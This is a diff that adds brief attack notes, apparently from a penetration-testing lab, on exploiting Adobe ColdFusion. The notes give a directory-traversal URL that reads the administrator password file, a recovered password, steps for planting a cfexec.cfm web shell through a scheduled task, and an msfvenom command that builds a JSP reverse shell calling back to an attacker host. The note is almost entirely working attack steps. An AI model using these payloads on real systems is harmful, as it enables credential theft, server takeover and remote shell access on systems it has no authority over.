@@ -1,0 +1,12 @@
+Adobe ColdFusion vulnerable to Directory Traversal
+
+
+http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+password: pass123
+
+create a schedule task (cfexec.cfm) in C:\inetpub\wwwroot\cfexec.cfm and check save output
+
+or reverse shell
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp
